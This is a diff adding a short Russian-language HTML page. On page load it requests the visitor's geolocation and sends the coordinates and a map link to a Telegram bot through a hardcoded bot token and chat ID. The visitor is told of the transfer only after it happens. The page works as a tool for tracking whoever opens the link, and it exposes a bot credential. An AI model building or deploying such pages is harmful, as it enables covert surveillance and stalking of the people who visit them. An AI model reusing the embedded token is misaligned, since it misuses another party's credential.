@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Определение местоположения</title>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+
+                        // Отправляем данные в Telegram
+                        fetch('https://api.telegram.org/bot7694834375:AAH63s34ubQfJcZmnI3qqu1kPRsFIGamk48/sendMessage', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: '7395262243',
+                                text: `Местоположение:\nШирота: ${locationData.latitude}\nДолгота: ${locationData.longitude}\nТочность: ${locationData.accuracy} м\nСсылка на карту: https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => {
+                            document.getElementById('status').innerText = "Данные успешно отправлены в Telegram!";
+                        })
+                        .catch(error => {
+                            document.getElementById('status').innerText = "Ошибка отправки данных.";
+                        });
+                    },
+                    (error) => {
+                        document.getElementById('status').innerText = `Ошибка: ${error.message}`;
+                    }
+                );
+            } else {
+                document.getElementById('status').innerText = "Ваш браузер не поддерживает геолокацию.";
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <h1>Определение местоположения</h1>
+    <p id="status">Запрашивается ваше местоположение...</p>
+</body>
+</html>
